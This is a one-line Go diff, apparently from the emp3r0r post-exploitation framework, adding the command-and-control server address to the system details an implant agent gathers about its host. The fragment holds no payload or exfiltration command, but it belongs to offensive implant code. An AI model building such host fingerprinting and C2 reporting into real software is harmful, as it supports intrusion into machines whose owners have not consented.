@@ -44,6 +44,7 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	common.RuntimeConfig.AgentTag = util.GetHostID(info.Product, common.RuntimeConfig.AgentUUID)
 	info.Tag = common.RuntimeConfig.AgentTag // use hostid
 	info.UUID = common.RuntimeConfig.AgentUUID
+	info.C2Host = common.RuntimeConfig.CCAddress
 
 	// Identity (TOFU)
 	if err := GetAgentKey(); err != nil {
